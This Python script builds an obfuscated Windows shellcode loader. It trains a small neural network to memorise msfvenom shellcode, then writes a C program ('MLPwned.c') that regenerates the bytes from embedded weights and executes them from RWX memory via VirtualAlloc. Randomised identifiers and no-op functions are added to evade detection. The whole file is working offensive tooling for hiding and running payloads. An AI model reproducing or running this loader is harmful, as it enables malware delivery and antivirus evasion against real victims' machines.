import subprocess
import torch
import torch.nn.functional as F
import random
import plotille

# Add msfvenom shellcode below

# Block size for context in the dataset
block_size = 30

# Random seed for reproducibility
seed = 2147483647

# Embedding dimensions
embedding_dims = 10

# Hidden layer size in the neural network
hidden_layer_size = 200

# Number of training steps
training_steps = 30000

# Batch size for training
batch_size = 32

# ====================

# STOP token for the dataset
STOP_TOKEN = 256

# Convert shellcode to decimal representation
decimal_shellcode = [int(byte) for byte in buf]

# Build the vocabulary of decimal values and mappings to/from integers
unique_values = sorted(list(set(decimal_shellcode + [STOP_TOKEN])))
stoi = {v: i for i, v in enumerate(unique_values)}
itos = {i: v for i, v in enumerate(unique_values)}

# Build the dataset
X, Y = [], []
context = [0] * block_size
for value in decimal_shellcode:
    ix = stoi[value]
    X.append(context)
    Y.append(ix)
    context = context[1:] + [ix]

# Add stop token as a target, but not in the context
X.append(context)
Y.append(stoi[STOP_TOKEN])

Xtr = torch.tensor(X)
Ytr = torch.tensor(Y)


# Initialize model parameters
g = torch.Generator().manual_seed(seed)
C = torch.randn((len(unique_values), embedding_dims), generator=g)
W1 = torch.randn((block_size * embedding_dims, hidden_layer_size), generator=g)
b1 = torch.randn(hidden_layer_size, generator=g)
W2 = torch.randn((hidden_layer_size, len(unique_values)), generator=g)
b2 = torch.randn(len(unique_values), generator=g)
parameters = [C, W1, b1, W2, b2]

for p in parameters:
    p.requires_grad = True

lossi = []
stepi = []
fig = plotille.Figure()

print("Training...")

# Training loop
for i in range(training_steps):
    ix = torch.randint(0, Xtr.shape[0], (batch_size,))
    emb = C[Xtr[ix]]
    h = torch.tanh(emb.view(-1, block_size * embedding_dims) @ W1 + b1)
    logits = h @ W2 + b2
    loss = F.cross_entropy(logits, Ytr[ix])

    for p in parameters:
        p.grad = None
    loss.backward()

    lr = 0.1 if i < training_steps * 0.625 else 0.01
    for p in parameters:
        p.data += -lr * p.grad

    stepi.append(i)
    lossi.append(loss.log10().item())

print(plotille.plot(stepi, lossi, height=20, width=50, interp="linear", lc="red", origin=False))

# Generate shellcode
context = [0] * block_size
generated = []
while True:
    emb = C[torch.tensor([context])]
    h = torch.tanh(emb.view(1, -1) @ W1 + b1)
    logits = h @ W2 + b2
    probs = F.softmax(logits, dim=1)
    ix = torch.multinomial(probs, num_samples=1).item()

    if ix == stoi[STOP_TOKEN]:
        break

    generated.append(itos[ix])
    context = context[1:] + [ix]

# Check if generated shellcode matches original shellcode
if generated == decimal_shellcode:
    # Randomly obfuscate variable names
    obfuscate = lambda name: "".join(random.choice("abcdefghijklmnopqrstuvwxyz") for _ in range(random.randint(5, 10)))

    # Obfuscated names
    block_size_name = obfuscate("block_size")
    embedding_dim_name = obfuscate("embedding_dim")
    hidden_dim_name = obfuscate("hidden_dim")
    vocab_size_name = obfuscate("vocab_size")
    stop_token_name = obfuscate("stop_token")
    result_name = obfuscate("result")
    matmul_name = obfuscate("matmul")
    softmax_name = obfuscate("softmax")
    argmax_name = obfuscate("argmax")
    tensor_view_name = obfuscate("tensor_view")
    tanh_activation_name = obfuscate("tanh_activation")
    exec_name = obfuscate("exec")
    generated_fun_name = obfuscate("generated_fun")

    # No-op function for obfuscation
    noop_name = obfuscate("noop")
    noop_code = f"""
void {noop_name}() {{
    // This function does nothing
    int x = 0;
    x += 1;
}}
"""

    c_code = f"""
#include <windows.h>
#include <stdio.h>
#include <math.h>
#include <string.h>

#define {block_size_name} %d
#define {embedding_dim_name} %d
#define {hidden_dim_name} %d
#define {vocab_size_name} %d
#define {stop_token_name} 256

// Function declarations
void {matmul_name}(float *{result_name}, const float *mat1, const float *mat2, int rows1, int cols1, int cols2);
void {softmax_name}(float *output, const float *input, int length);
int {argmax_name}(const float *array, int length);
void {tensor_view_name}(float *{result_name}, const float *input, int rows, int cols);
void {tanh_activation_name}(float *output, const float *input, int length);
{noop_code}

// Model parameters
""" % (block_size, C.shape[1], W1.shape[1], len(unique_values))

    # Add C (embedding) matrix
    c_code += "float C[%d][%d] = {\n" % C.shape
    for row in C.detach().numpy():
        c_code += "    {" + ", ".join([f"{x:.8f}" for x in row]) + "},\n"
    c_code += "};\n\n"

    # Add W1 matrix
    c_code += "float W1[%d][%d] = {\n" % W1.shape
    for row in W1.detach().numpy():
        c_code += "    {" + ", ".join([f"{x:.8f}" for x in row]) + "},\n"
    c_code += "};\n\n"

    # Add b1 vector
    c_code += "float b1[%d] = {" % b1.shape[0]
    c_code += ", ".join([f"{x:.8f}" for x in b1.detach().numpy()])
    c_code += "};\n\n"

    # Add W2 matrix
    c_code += "float W2[%d][%d] = {\n" % W2.shape
    for row in W2.detach().numpy():
        c_code += "    {" + ", ".join([f"{x:.8f}" for x in row]) + "},\n"
    c_code += "};\n\n"

    # Add b2 vector
    c_code += "float b2[%d] = {" % b2.shape[0]
    c_code += ", ".join([f"{x:.8f}" for x in b2.detach().numpy()])
    c_code += "};\n\n"

    # Add vocabulary (changed to int to accommodate STOP_TOKEN)
    c_code += "int itos[%d] = {" % len(itos)
    c_code += ", ".join([f"{itos[i]}" for i in range(len(itos))])
    c_code += "};\n\n"

    # Add main function and other necessary functions with no-op calls
    c_code += f"""
int main() {{
    {noop_name}();  // Call no-op function
    unsigned char {generated_fun_name}[1024];
    int generated_length = 0;
    int context[{block_size_name}] = {{0}};

    while (generated_length < 1024) {{
        float emb[{block_size_name}][{embedding_dim_name}];
        for (int i = 0; i < {block_size_name}; i++) {{
            for (int j = 0; j < {embedding_dim_name}; j++) {{
                emb[i][j] = C[context[i]][j];
            }}
        }}

        float emb_view[1][{block_size_name} * {embedding_dim_name}];
        {tensor_view_name}(&emb_view[0][0], &emb[0][0], 1, {block_size_name} * {embedding_dim_name});

        float h[{hidden_dim_name}];
        {matmul_name}(h, &emb_view[0][0], &W1[0][0], 1, {block_size_name} * {embedding_dim_name}, {hidden_dim_name});
        for (int i = 0; i < {hidden_dim_name}; i++) {{
            h[i] += b1[i];
        }}
        {tanh_activation_name}(h, h, {hidden_dim_name});

        float logits[{vocab_size_name}];
        {matmul_name}(logits, h, &W2[0][0], 1, {hidden_dim_name}, {vocab_size_name});
        for (int i = 0; i < {vocab_size_name}; i++) {{
            logits[i] += b2[i];
        }}

        float probs[{vocab_size_name}];
        {softmax_name}(probs, logits, {vocab_size_name});

        int next_byte = {argmax_name}(probs, {vocab_size_name});

        if (itos[next_byte] == {stop_token_name}) {{
            break;
        }}

        {noop_name}();  // Call no-op function
        {generated_fun_name}[generated_length++] = (unsigned char)itos[next_byte];

        // Update context
        for (int i = 0; i < {block_size_name} - 1; i++) {{
            context[i] = context[i + 1];
        }}
        context[{block_size_name} - 1] = next_byte;
    }}

    void *{exec_name} = VirtualAlloc(0, sizeof({generated_fun_name}), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // Copy the generated function to executable memory
    memcpy({exec_name}, {generated_fun_name}, sizeof({generated_fun_name}));

    // Execute the generated function
    ((void(*)()){exec_name})();

    // Free the allocated memory
    VirtualFree({exec_name}, 0, MEM_RELEASE);

    return 0;
}}

void {matmul_name}(float *{result_name}, const float *mat1, const float *mat2, int rows1, int cols1, int cols2) {{
    for (int i = 0; i < rows1; i++) {{
        for (int j = 0; j < cols2; j++) {{
            {result_name}[i * cols2 + j] = 0;
            for (int k = 0; k < cols1; k++) {{
                {result_name}[i * cols2 + j] += mat1[i * cols1 + k] * mat2[k * cols2 + j];
            }}
        }}
    }}
}}

void {softmax_name}(float *output, const float *input, int length) {{
    float max_val = input[0];
    for (int i = 1; i < length; i++) {{
        if (input[i] > max_val) {{
            max_val = input[i];
        }}
    }}

    float sum = 0;
    for (int i = 0; i < length; i++) {{
        output[i] = exp(input[i] - max_val);
        sum += output[i];
    }}

    for (int i = 0; i < length; i++) {{
        output[i] /= sum;
    }}
}}

int {argmax_name}(const float *array, int length) {{
    int max_index = 0;
    for (int i = 1; i < length; i++) {{
        if (array[i] > array[max_index]) {{
            max_index = i;
        }}
    }}
    return max_index;
}}

void {tensor_view_name}(float *{result_name}, const float *input, int rows, int cols) {{
    memcpy({result_name}, input, rows * cols * sizeof(float));
}}

void {tanh_activation_name}(float *output, const float *input, int length) {{
    for (int i = 0; i < length; i++) {{
        output[i] = tanh(input[i]);
    }}
}}
"""

    # Save to file
    with open("MLPwned.c", "w") as f:
        f.write(c_code)

    print("C code has been generated and saved to 'MLPwned.c'")

else:
    print("The generated shellcode does NOT match the original shellcode. Try tuning hyperparameters and train again.")
